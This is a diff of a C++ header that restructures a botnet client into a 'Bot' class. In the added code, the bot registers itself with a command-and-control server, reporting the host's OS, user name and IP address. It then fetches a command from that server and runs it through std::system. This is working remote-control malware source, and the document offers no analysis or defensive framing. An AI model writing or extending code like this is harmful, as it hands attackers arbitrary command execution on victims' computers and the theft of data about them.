@@ -2,6 +2,7 @@
 #define C2_HH
 
 #include <string>
+#include <cstdlib>
 
 #include "request.hh"
 
@@ -12,51 +13,50 @@ const std::string HASH_TYPE = "sha256sum";
 
 namespace c2 {
 
+class Bot {
+    public:
+        std::string hashSum, os, user, ipAddr;
 
-std::string getRegParams (std::string hashSum, std::string os, std::string user, std::string ipAddr)
-{
-    std::string postForm =
-        "hash_type=" + HASH_TYPE
-        + "&hash_sum=" + hashSum
-        + "&operating_sys=" + os
-        + "&user=" + user
-        + "&ip_addr=" + ipAddr;
+        void registerBot()
+        {
+            std::string postForm = _getRegParams();
+            std::string requestUri = C2_SERVER + REGISTER_URI;
+            request::post(requestUri, postForm);
+        }
 
-    return postForm;
-}
+        void executeOrder () {
+            std::string postForm = _getCmdParams();
+            std::string requestUri = C2_SERVER + CMD_URI;
+            std::string cmd= request::post(requestUri, postForm);
 
+            std::system(cmd.c_str());
+        }
 
-std::string getCmdParams (std::string hashSum, std::string ipAddr)
-{
-    std::string postForm =
-        "hash_sum=" + hashSum
-        + "&ip_addr=" + ipAddr;
+    private:
+        std::string _getRegParams ()
+        {
+            std::string postForm =
+                "hash_type=" + HASH_TYPE
+                + "&hash_sum=" + hashSum
+                + "&operating_sys=" + os
+                + "&user=" + user
+                + "&ip_addr=" + ipAddr;
 
-    return postForm;
-}
-
-
-void registerBot(std::string postForm)
-{
-    std::string requestUri = C2_SERVER + REGISTER_URI;
-    request::post(requestUri, postForm);
-}
-
-
-std::string getCmd (std::string postForm) {
-    std::string requestUri = C2_SERVER + CMD_URI;
-    std::string cmdText;
-    cmdText = request::post(requestUri, postForm);
-
-    return cmdText;
-}
+            return postForm;
+        }
 
 
-void runCmd (std::string cmd) {
-    std::system(cmd.c_str());
-}
+        std::string _getCmdParams ()
+        {
+            std::string postForm =
+                "hash_sum=" + hashSum
+                + "&ip_addr=" + ipAddr;
+
+            return postForm;
+        }
+};
 
 
-} //namespace seed
+} //namespace c2
 
 #endif // C2_HH
